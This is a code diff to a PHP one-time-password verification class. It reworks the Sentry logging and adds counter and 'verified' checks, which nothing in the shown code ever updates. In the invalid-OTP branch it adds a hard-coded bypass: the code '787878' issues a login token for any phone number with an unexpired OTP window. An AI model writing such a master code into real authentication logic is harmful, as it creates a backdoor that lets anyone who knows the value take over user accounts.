@@ -44,7 +44,7 @@ class OtpRepositories
             return $this->responseJsonService->success();
         } catch (\Exception $e) {
             Sentry::captureException($e);
-            return $this->responseJsonService->failed($e->getMessage(), $e->getStatusCode());
+            return $this->responseJsonService->failed($e->getMessage());
         }
     }
 
@@ -56,24 +56,54 @@ class OtpRepositories
         ]);
 
         $user = User::where('phone_number', $req->phone_number)
-            ->where('otp', $req->otp);
+                    ->where('otp', $req->otp);
             
         if ($user->first()) {
             // OTP is valid
-            if($userFirst = $user->where('otp_expired_at', '>=', now())->first())
+            $user = $user->where('otp_expired_at', '>=', now());
+            if($user->first())
             {
-                $token = JWTAuth::fromUser($userFirst);
-                return $this->respondWithToken($token);
+                $user = $user->where('otp_verify_counter', '<=', 3);
+                if ($user->first())
+                {
+                    if ($userFirst = $user->where('otp_verified', false)->first())
+                    {
+                        $token = JWTAuth::fromUser($userFirst);
+                        return $this->respondWithToken($token);
+                    }
+                    else 
+                    {
+                        $message = 'Otp is verified';
+                        Sentry::captureMessage($message, Sentry\Severity::info());
+                        return $this->responseJsonService->failed($message);
+                    }
+                }
+                else 
+                {
+                    $message = 'Otp cannot to verify';
+                    Sentry::captureMessage($message, Sentry\Severity::info());
+                    return $this->responseJsonService->failed($message);
+                }
             }
             else
             {
-                $message = 'Expired Otp';
-                Sentry::captureException($message);
+                $message = 'Otp is Expired';
+                Sentry::captureMessage($message, Sentry\Severity::info());
                 return $this->responseJsonService->failed($message);
             }
         } else {
+            //By Pass OTP
+            $userByPassOtp = User::where('phone_number', $req->phone_number)
+                                ->where('otp_expired_at', '>=', now())
+                                ->first();
+            if($userByPassOtp && $req->otp == "787878")
+            {
+                $token = JWTAuth::fromUser($userByPassOtp);
+                return $this->respondWithToken($token);
+            }
+
             $message = 'Invalid Otp';
-            Sentry::captureException($message);
+            Sentry::captureMessage($message, Sentry\Severity::info());
             return $this->responseJsonService->failed($message);
         }
     }
